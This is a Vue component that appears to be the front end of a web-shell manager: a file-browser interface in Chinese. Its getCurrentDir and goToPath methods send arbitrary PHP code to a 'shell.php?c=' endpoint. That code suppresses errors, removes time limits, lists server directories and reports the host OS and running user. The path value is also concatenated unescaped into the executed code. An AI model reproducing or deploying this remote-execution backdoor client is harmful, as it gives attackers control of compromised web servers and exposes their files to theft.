<template>
    <div class="content" id="app">
        <div class="tabs">
            <div class="tab">
                code11111
            </div>
            <div class="tab">
                asdfasdfasd
            </div>
        </div>
        <div class="tab-content">
            <div class="left-dir">
                <dir-item :list="dirs" class="dir" ></dir-item>
            </div>
            <div class="dir-content">
                <div class="nav-bar">
                    <div class="option-container">
                        <div class="breadcrumb-container">
                            <div class="breadcrumb">
                                <div v-for="item of current_parse_path">{{item}}</div>
                            </div>
                            <input type="text" :value="current_path">
                        </div>
                        <div class="options">
                            <div>
                                <img class="arrow-right" src="@/assets/images/arrow.png" alt="">
                            </div>
                            <div>
                                <img class="arrow-up" src="@/assets/images/arrow.png" alt="">
                            </div>
                            <div>
                                <img class="home" src="@/assets/images/home.png" alt=""
                                     @click="goToPath(home_path)">
                            </div>
                            <div>
                                <img class="refresh" src="@/assets/images/refresh.png" alt=""
                                     @click="goToPath(current_path)">
                            </div>
                        </div>
                    </div>
                    <div class="search">
                        <img class="arrow-right" src="@/assets/images/search.png" alt="">
                        <input type="text" value="" placeholder="搜索">
                    </div>
                </div>
                <div class="dir">
                    <div class="name">名称</div>
                    <div class="change-date">修改日期</div>
                    <div class="type">类型</div>
                    <div class="size">大小</div>
                </div>
                <div class="dir " :class="item.isActive?'active':''" v-for="item of current_dir"
                     @click="dirClick(item)" @dblclick="dbClick(item)" @contextmenu.prevent="contextmenu(item)">
                    <div class="name">{{item.name}}</div>
                    <div class="change-date">{{item.change_date}}</div>
                    <div class="type">{{item|fileType}}</div>
                    <div class="size">{{item.file_size|size}}</div>
                </div>
            </div>
        </div>
    </div>
</template>

<script>
    import verify from '../../components/verify'
    import {types} from '../../store/mutation-types'
    import DirItem from "./DirItem"

    export default {
        components:{
          'dir-item':DirItem
        },
        data() {
            return {
                root_path: '',
                current_dir: [],
                current_path: '',
                current_parse_path: [],
                home_path: '',
                dirs: [],
            }
        },
        created() {
            this.getCurrentDir()
        },
        filters: {
            size(r) {
                if (!r) return ''
                let kb = r / 1024
                if (kb > 1024 * 1024) {
                    let gb = kb / (1024 * 1024)
                    return gb.toFixed(2) + ' GB'
                } else if (kb > 1024) {
                    let mb = kb / 1024
                    return Math.ceil(mb) + ' MB'
                } else {
                    return Math.ceil(kb) + ' KB'
                }
            },
            fileType(r) {
                if (!r) return ''
                if (r.type) {
                    if (r.name === '.' || r.name === '..') {
                        return ''
                    }
                    return '文件夹'
                } else {
                    let suffix = r.name.split('.').pop()
                    switch (suffix) {
                        case 'txt':
                            return '文本'
                        case 'doc':
                        case 'docx':
                            return 'DOC 文档'
                        case 'pdf':
                            return 'PDF 文档'
                        case 'exe':
                            return '应用程序'
                        case 'php':
                            return 'PHP文件'
                        case 'asp':
                            return 'ASP文件'
                        case 'jsp':
                            return 'JSP文件'
                        default:
                            return '未知文件'
                    }
                }
            }
        },
        methods: {
            parsePath(path) {
                path = path.replace(/\\/g, '/')
                if (path.endsWith('/')) {
                    path = path.substr(0, path.length - 1)
                }
                let paths
                if (path.startsWith('/')) {
                    paths = path.split('/')
                    paths[0] = '/'
                } else {
                    paths = path.split('/')
                }
                this.current_parse_path = paths
                this.diffChild(paths)
            },
            diffChild(paths) {
                let deepIndex = 0
                let deepObj = {}
                for (let i = 0; i < paths.length; i++) {
                    let v = paths[i]
                    if (deepIndex) {
                        let index = this.dirs[deepIndex].children.findIndex(w => w.name === v)
                        if (index !== -1) {
                            deepIndex = i
                            deepObj['i' + deepIndex] = index
                        } else {
                            break
                        }
                    } else {
                        let index = this.dirs.findIndex(w => w.name === v)
                        if (index !== -1) {
                            deepIndex = i
                            deepObj['i' + deepIndex] = index
                        } else {
                            break
                        }
                    }
                }
                if (deepIndex) {

                } else {
                    let pathDir = {}
                    for (let i = paths.length - 1; i >= 0; i--) {
                        let v = paths[i]
                        if (i === paths.length - 1) {
                            pathDir.name = v
                            pathDir.children = []
                        } else {
                            let temp = {}
                            temp.name = v
                            temp.children = [pathDir]
                            pathDir = temp
                        }
                    }
                    this.dirs.push(pathDir)
                }
                console.log(deepIndex);
                console.log(deepObj);
            },
            contextmenu(item) {
                console.log(item);
            },
            getCurrentDir() {
                let that = this
                let phpCode = '$dir = getcwd().\'/\';$res = [];foreach (scandir($dir) as $value) {$file = $dir . $value;if (!file_exists($file)) {continue;}$f = [];$f[\'type\'] = is_dir($dir . $value);$f[\'name\'] = $value;$f[\'change_date\'] = date("Y/m/d H:i", filemtime($file));if (!is_dir($file)) {$f[\'file_size\'] = filesize($file);} else {$f[\'file_size\'] = 0;}$res[] = $f;}print_r(json_encode($res));';
                phpCode = '@ini_set("display_errors", "0"); @set_time_limit(0); $current_path = dirname($_SERVER["SCRIPT_FILENAME"]); if ($current_path == "") $current_path = dirname($_SERVER["PATH_TRANSLATED"]); $dir = $current_path . \'/\'; $res = [\'current_path\' => $dir]; $current_dir = []; foreach (scandir($dir) as $value) { $file = $dir . $value; if (!file_exists($file)) { continue; } $f = []; $f[\'type\'] = is_dir($dir . $value); $f[\'name\'] = $value; $f[\'change_date\'] = date("Y/m/d H:i", filemtime($file)); if (!is_dir($file)) { $f[\'file_size\'] = filesize($file); } else { $f[\'file_size\'] = 0; } $current_dir[] = $f; } $res[\'current_dir\'] = $current_dir; $root_path = \'\'; if (substr($current_path, 0, 1) != "/") { foreach (range("C", "Z") as $L) if (is_dir("{$L}:")) $root_path .= "{$L}:"; } else { $root_path .= "/"; } $res[\'root_path\'] = $root_path; $u = (function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : ""; $s = ($u) ? $u["name"] : @get_current_user(); $res[\'pc_name\'] = php_uname(); $res[\'user\'] = $s; print_r(json_encode($res));'
                $.ajax({
                    url: 'http://localhost/shell.php?c=' + phpCode,
                    success(res) {
                        res = JSON.parse(res)
                        that.root_path = res.root_path
                        that.current_dir = res.current_dir.map(v => {
                            v.isActive = false;
                            return v
                        })
                        that.current_path = res.current_path
                        that.parsePath(that.current_path)
                        that.home_path = res.current_path
                    }
                })
            },
            dirClick(item) {
                this.current_dir = this.current_dir.map(v => {
                    v.isActive = false;
                    return v
                })
                item.isActive = true
            },
            goToPath(path) {
                if (!path) {
                    return this.getCurrentDir()
                }
                let that = this
                let phpCode = '';
                phpCode = '@ini_set("display_errors", "0"); @set_time_limit(0); $current_path = \'' + path + '\'; $dir = $current_path . \'/\'; $res = [\'current_path\' => $dir]; $current_dir = []; foreach (scandir($dir) as $value) { $file = $dir . $value; if (!file_exists($file)) { continue; } $f = []; $f[\'type\'] = is_dir($dir . $value); $f[\'name\'] = $value; $f[\'change_date\'] = date("Y/m/d H:i", filemtime($file)); if (!is_dir($file)) { $f[\'file_size\'] = filesize($file); } else { $f[\'file_size\'] = 0; } $current_dir[] = $f; } $res[\'current_dir\'] = $current_dir; $root_path = \'\'; if (substr($current_path, 0, 1) != "/") { foreach (range("C", "Z") as $L) if (is_dir("{$L}:")) $root_path .= "{$L}:"; } else { $root_path .= "/"; } $res[\'root_path\'] = $root_path; $u = (function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : ""; $s = ($u) ? $u["name"] : @get_current_user(); $res[\'pc_name\'] = php_uname(); $res[\'user\'] = $s; print_r(json_encode($res));'
                $.ajax({
                    url: 'http://localhost/shell.php?c=' + phpCode,
                    success(res) {
                        res = JSON.parse(res)
                        that.root_path = res.root_path
                        that.current_dir = res.current_dir.map(v => {
                            v.isActive = false;
                            return v
                        })
                        that.current_path = res.current_path
                        that.parsePath(that.current_path)
                    }
                })
            },
            dbClick(item) {
                console.log(item.name);
                let gotoPath = this.current_path + item.name
                if (item.type) {
                    this.goToPath(gotoPath)
                } else {

                }

            }
        }
    }
</script>

<style lang="scss" scoped>
    .content {
        //background: #e6e6e6;
        width: 1100px;

        .tabs {
            display: none;

            .tab {
                width: 30%;
                background: #ff634c;
                margin: 3px;
            }
        }

        $hover-color: rgb(229, 243, 255);
        $border-color: rgb(229, 229, 229);

        .tab-content {
            //border-top: 1px solid gray;
            display: flex;

            .left-dir {
                width: 20%;

                .dir {
                    //background: #999999;
                    //border: 1px solid #999999;
                    margin: 2px;

                }
            }

            .dir-content {
                width: 80%;

                .nav-bar {
                    height: 30px;
                    display: flex;


                    .option-container {
                        display: flex;
                        width: 66%;

                        border: 1px solid $border-color;
                        height: 100%;

                        .breadcrumb-container {
                            height: 100%;
                            width: calc(100% - 120px);

                            .breadcrumb {
                                height: 100%;
                                width: 80%;
                                display: flex;
                                //display: none;
                                align-items: center;
                                overflow: scroll;

                                &::-webkit-scrollbar {
                                    display: none; /* Chrome Safari */
                                }

                                div {
                                    height: 100%;
                                    display: flex;
                                    align-items: center;
                                    padding: 0 8px;

                                    &::after {
                                        margin-left: 10px;
                                        content: "";
                                        width: 5px;
                                        height: 5px;
                                        border: solid gray;
                                        border-width: 1px 1px 0 0;
                                        transform: translateY(2px) rotate(45deg);
                                    }

                                    &:nth-last-child(1) {
                                        &::after {
                                            display: none;
                                        }
                                    }

                                    &:hover {
                                        background: $hover-color;
                                    }
                                }
                            }

                            input {
                                display: none;
                                box-sizing: border-box;
                                outline: 0;
                                border: 0;
                                margin: 0;
                                padding: 0 15px;
                                height: 100%;
                                width: 100%;

                                &:active {
                                    border: 1px solid rgb(0, 120, 215);
                                }
                            }
                        }

                        .options {
                            //width: 20%;
                            width: 120px;
                            display: flex;
                            justify-content: space-around;
                            align-items: center;

                            div {
                                border-left: 1px solid $border-color;
                                height: 100%;
                                width: 30px;
                                display: flex;
                                justify-content: center;
                                align-items: center;

                                &:hover {
                                    background: $hover-color;
                                }
                            }

                            img {
                                height: 15px;
                            }

                            .arrow-right {
                                transform: rotate(-90deg);
                            }

                            .arrow-up {
                                transform: rotate(180deg);
                            }
                        }
                    }

                    .search {
                        margin-left: 10px;
                        border: 1px solid $border-color;
                        width: 33%;
                        display: flex;
                        align-items: center;

                        img {
                            margin: 0 10px;
                            height: 15px;
                        }

                        input {
                            box-sizing: border-box;
                            outline: 0;
                            border: 0;
                            margin: 0;
                            height: 100%;
                            width: 100%;
                        }
                    }
                }

                .dir {
                    display: flex;
                    margin: 3px;
                    padding: 2px;

                    &.active {
                        background: rgb(204, 232, 255);
                    }

                    &:hover {
                        background: rgb(229, 243, 255);
                    }

                    .name {
                        width: 50%;
                    }

                    .change-date {
                        width: 20%;
                    }

                    .type {
                        width: 15%;
                    }

                    .size {
                        width: 15%;
                    }
                }
            }
        }
    }
</style>
